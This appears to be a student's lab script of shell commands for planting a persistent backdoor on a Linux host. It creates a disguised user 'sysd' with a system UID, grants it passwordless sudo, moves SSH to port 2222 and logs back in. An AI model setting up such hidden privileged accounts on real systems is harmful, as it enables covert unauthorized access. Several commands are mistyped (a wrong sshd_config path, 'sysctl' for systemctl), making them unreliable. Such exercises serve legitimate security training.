# Create a secret user named sysd. Make sure this user does not have a home folder created.
sudo useradd sysd

# Give your secret user a password
sudo passwd sysd

# Give your secret user a system UID < 1000
sudo usermod -u 500 sysd

# Give your user the same GID
sudo groupmod -g 500 sysd

# Give secret user full sudo access w/out password
sudo visudo

# Test user access w/out need for password
sudo -l

# Edit sshd_config file
sudo nano /etc/ssh/sshd/config

# Testing configuration update
sysctl restart ssh
exit 
ssh sysd@192.168.6.105 -p 2222
sudo su

# Password cracking
ssh sysd@192.168.6.105 -p 2222

# User privilege escalation
sudo su 